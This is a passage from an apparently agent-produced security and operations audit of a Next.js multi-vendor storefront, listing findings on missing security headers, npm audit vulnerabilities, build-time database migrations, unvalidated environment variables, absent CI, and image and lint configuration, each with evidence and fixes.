  fix: Add to next.config.ts: `async headers(){ return [{ source: '/(.*)', headers: [ {key:'Strict-Transport-Security', value:'max-age=63072000; includeSubDomains; preload'}, {key:'X-Frame-Options', value:'SAMEORIGIN'}, {key:'X-Content-Type-Options', value:'nosniff'}, {key:'Referrer-Policy', value:'strict-origin-when-cross-origin'}, {key:'Permissions-Policy', value:'camera=(), microphone=(), geolocation=()'}, {key:'Content-Security-Policy', value:"default-src 'self'; img-src 'self' https://*.ufs.sh https://utfs.io https://images.unsplash.com data:; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'self' https://*.ufs.sh https://api.bog.ge; frame-ancestors 'self'"} ] }]; }`. Tighten script-src with nonces once inline scripts are audited.
  verify_reasoning: The factual core of the finding is accurate. next.config.ts (lines 3-12) is exactly `{ images: { remotePatterns: [images.unsplash.com] } }` with no `async headers()` block. A grep for `async headers|Content-Security-Policy|Strict-Transport-Security|X-Frame-Options|X-Content-Type-Options|Referrer-Policy|Permissions-Policy` across src/ and next.config.ts returns zero matches (exit 1), and there is no middleware.ts that could set headers instead. So the app ships no CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, or Permissions-Policy. The payments context is real (src/lib/bo

[High] npm audit: 14 vulns (5 high) whose only fixes are semver-major upgrades or downgrades — `audit fix --force` would break/regress the app | VERDICT=CONFIRMED (corrected_sev=Medium)
  file: package.json:43
  confidence: High
  evidence: npm audit --json: 5 high / 7 moderate / 2 low. High: hono (multiple — CORS wildcard-with-credentials reflection, JWT middleware accepts any auth scheme, serve-static path traversal, Set-Cookie injection) fixAvailable non-major; uploadthing + @uploadthing/react + @uploadthing/shared + effect (Effect AsyncLocalStorage context contamination under concurrent RPC) — fixAvailable is a DOWNGRADE to uploadthing 6.12.0 / @uploadthing/react 6.6.0 (isSemVerMajor). Moderate: postcss XSS via unescaped </style> and js-yaml quadratic DoS — both chained through `next` whose fixAvailable is `next@9.3.3` (a nonsensical major downgrade); better-auth moderate fixAvailable is better-auth@1.4.3 (downgrade from 1.6.11); @hono/node-server/prisma fix is prisma@6.19.3 (major downgrade from 7.8). Low: @babel/core arbitrary file read, esbuild dev-server file read (Windows).
  impact: The high-severity hono issues affect the better-auth request layer (auth is the trust boundary for this multi-tenant app). Because npm's remediation graph points to downgrades/majors, a naive `npm audit fix --force` would roll back Next, Prisma, uploadthing and better-auth to incompatible versions and break the build — so these will silently sit unpatched.
  fix: Do not run `audit fix --force`. Instead: (1) pin/upgrade transitive `hono`, `postcss`, `js-yaml`, `@babel/core`, `esbuild` via package.json `overrides` to their patched minors (all have non-major patched releases upstream); (2) track uploadthing/effect and better-auth fixed releases and bump forward (not down) when available; (3) add `npm audit --audit-level=high` as a CI gate. Re-run audit after overrides to confirm high count drops.
  verify_reasoning: I located the actual audit target at /private/tmp/claude-501/.../scratchpad/multivendor (the finding's "package.json:43" is uploadthing ^7.7.4 in that file — none of these deps exist anywhere else under /Users/arsenioniani/Projects). I ran `npm audit --json` against the installed node_modules + lockfile and the factual core of the finding is accurate:

Counts EXACT: {low:2, moderate:7, high:5, critical:0, total:14}.

Remediation graph EXACT as claimed:
- hono <=4.12.24 (high): fixAvailable=true (clean non-major). Its via list literally contains the high "CORS Middleware reflects any Origin wit

[Medium] Build script runs `prisma migrate deploy` against the live DATABASE_URL on every build
  file: package.json:7
  confidence: High
  evidence: `"build": "prisma generate && prisma migrate deploy && node ... next build"`. prisma.config.ts:13 resolves the datasource from `process.env['DATABASE_URL']` unguarded. There are 10+ migrations in prisma/migrations/. On Vercel/CI the build step has DATABASE_URL set to the production DB.
  impact: Build-time schema mutation couples deploy artifacts to live-DB state: (1) a bad/locking migration fails the build and can leave prod schema half-migrated; (2) preview/PR builds pointed at the prod URL would migrate production before code ships; (3) concurrent builds race on migrate deploy. Migrations should be a discrete, gated release step, not a side effect of asset compilation.
  fix: Remove `prisma migrate deploy` from `build`. Keep `prisma generate` (needed for the client) in build, and run `prisma migrate deploy` as a separate release/deploy hook (e.g. Vercel `release` command or a CI job) that runs once per deploy against prod only, after human/gate approval.

[Medium] No environment-variable validation; 13 unguarded process.env reads with non-null assertions that mask misconfiguration
  file: src/lib/bog.ts:17
  confidence: High
  evidence: No zod/@t3-oss env schema exists (grep for createEnv/@t3-oss/envSchema/env.ts returns nothing). 13 distinct keys read directly: DATABASE_URL, RESEND_API_KEY, EMAIL_FROM, BOG_CLIENT_ID, BOG_CLIENT_SECRET, GOOGLE_CLIENT_ID/SECRET, NEXT_PUBLIC_APP_URL, NEXT_PUBLIC_ROOT_DOMAIN, VERCEL_TOKEN/PROJECT_ID/TEAM_ID, NODE_ENV. bog.ts:17-18 uses `process.env.BOG_CLIENT_ID!` / `BOG_CLIENT_SECRET!`; auth/index.ts:44-45 casts GOOGLE creds `as string`; db/prisma.ts:5 `DATABASE_URL!`.
  impact: Misconfigured secrets fail late and silently instead of at boot. Missing BOG creds produce `Basic base64(undefined:undefined)` sent to Bank of Georgia's OAuth endpoint (a live payment-auth call with garbage credentials) rather than a clear startup error. There is no single source of truth for required env, and no .env.example, making onboarding/deploy error-prone.
  fix: Add src/env.ts using zod (or @t3-oss/env-nextjs): validate all server + NEXT_PUBLIC_* vars at import, throw a descriptive error listing missing keys, and import it in next.config.ts so misconfig fails the build fast. Replace `process.env.X!` reads with the validated `env` object. Commit a .env.example enumerating every key.

[Medium] No CI/CD, no Dockerfile, no tests, no lint/type gate; default create-next-app README and shipped build artifacts in repo
  file: package.json:5
  confidence: High
  evidence: Scripts are only dev/build/start/lint — no `test` script; no test runner in devDependencies (grep vitest/jest/playwright = none). No .github/ directory, no Dockerfile/.dockerignore, no vercel.json (filesystem search returns none). README.md is the stock create-next-app text (mentions Geist font/Vercel deploy, nothing about this app's env or setup). Repo also ships non-source artifacts: `MultiStore Landing Page.zip` (43KB) at root and a `claude-design-export/` folder with .html mockups — eslint.log shows eslint even lints claude-design-export/support.js and prisma/seed.ts.
  impact: Nothing prevents a regression from shipping: the 25 ESLint errors / 29 warnings and (as shown) a build-breaking missing-env condition can all reach production because no automated gate exists. No reproducible container build. No documented setup path for a new engineer. Ships dead-weight design artifacts to the deploy bundle and lint scope.
  fix: Add a CI workflow running `prisma generate`, `tsc --noEmit`, `eslint` (as a failing gate), `npm audit --audit-level=high`, and `next build` on PRs. Add a `test` script + a smoke/integration test (at minimum for tenant isolation and BOG callback). Add a multi-stage Dockerfile + .dockerignore. Replace README with real setup/env docs and a .env.example. Move design exports/zip out of the app repo (or add to .gitignore + eslint ignores).

[Medium] images.remotePatterns is vestigial (only unsplash) while all uploads live on *.ufs.sh; every next/image is force-`unoptimized` to compensate, disabling image optimization app-wide
  file: next.config.ts:5
  confidence: High
  evidence: remotePatterns allows only images.unsplash.com. But uploads come from uploadthing: src/lib/uploadthing.ts:9/14/19 return `file.ufsUrl` and ImageUploader.tsx:22 maps `r.ufsUrl` — uploadthing v7 ufsUrl is `https://<appId>.ufs.sh/f/<key>`, which is not in remotePatterns. 37 files import next/image; every single next/image render of an uploaded URL sets `unoptimized` (verified: no next/image usage lacks the flag — PipelineProductGrid.tsx:55/64, ProductDetail.tsx:143/171, CartDrawer, CheckoutForm.tsx:341, CollectionItem/List, BannerSplit, order pages all pass `unoptimized`).
  impact: Two problems: (1) the remotePatterns config is misleading/dead — it protects nothing and doesn't cover the real image host; (2) to avoid the 'hostname not configured' 400, the team disabled the Next image optimizer on 100% of storefront/product imagery, so full-resolution originals are served with no resize/WebP/AVIF/lazy pipeline — real bandwidth and LCP cost on merchant storefronts. Any future next/image added without remembering `unoptimized` will 400 in production.
  fix: Add `{ protocol:'https', hostname:'*.ufs.sh' }` and `{ protocol:'https', hostname:'utfs.io' }` to remotePatterns, then remove the blanket `unoptimized` props so the optimizer handles uploaded images. Keep unsplash only if seed/demo data actually uses it.

[Low] Bleeding-edge / rapidly-moving pins on core stack increase supply-chain and stability risk
  file: package.json:31
  confidence: Medium
  evidence: next 16.2.6 (exact), react/react-dom 19.2.4 (exact), @prisma/client & prisma ^7.8.0, better-auth ^1.6.11, uploadthing ^7.7.4, zod ^4.4.3, tailwindcss ^4. Several are very new majors (Prisma 7, Tailwind 4, Zod 4) or fast-moving auth/upload libs where the npm-audit remediation graph itself points backward (better-auth 1.4.3, uploadthing 6.x, prisma 6.x).
  impact: Auth and payment-adjacent libraries on freshly-cut majors carry higher regression/CVE churn, and the caret ranges on prisma/better-auth/uploadthing allow non-deterministic minor bumps into that churn. Combined with no CI and no lockfile-enforced install in build, dependency drift can land untested code in prod.
  fix: Pin exact versions (drop carets) for better-auth, prisma/@prisma/client, uploadthing, and next; enforce `npm ci` (lockfile) in the build/CI; add Renovate/Dependabot with a review gate so upgrades are deliberate and tested rather than implicit.

[Low] ESLint (25 errors / 29 warnings) does not ignore committed design artifacts or gate the build
  file: eslint.config.mjs:9
  confidence: Medium
  evidence: globalIgnores only lists .next/out/build/next-env.d.ts. eslint.log shows lint running over claude-design-export/support.js and prisma/seed.ts, and reports 25 errors / 29 warnings total. next-build.log shows the build proceeding past TypeScript without an ESLint gate (it fails later at page-data), so these 25 errors are non-blocking.
  impact: Lint noise from non-app artifacts dilutes signal, and 25 real errors ship because lint is not a gate. Since Next 16 does not run ESLint during `next build` by default, these errors are effectively unenforced.
  fix: Add design exports/generated output to globalIgnores (`claude-design-export/**`, `landing-theme/**`, `themes-claude/**`), then run `eslint --max-warnings=0` as a required CI step so the 25 errors block merges. Triage and fix the current 25 errors.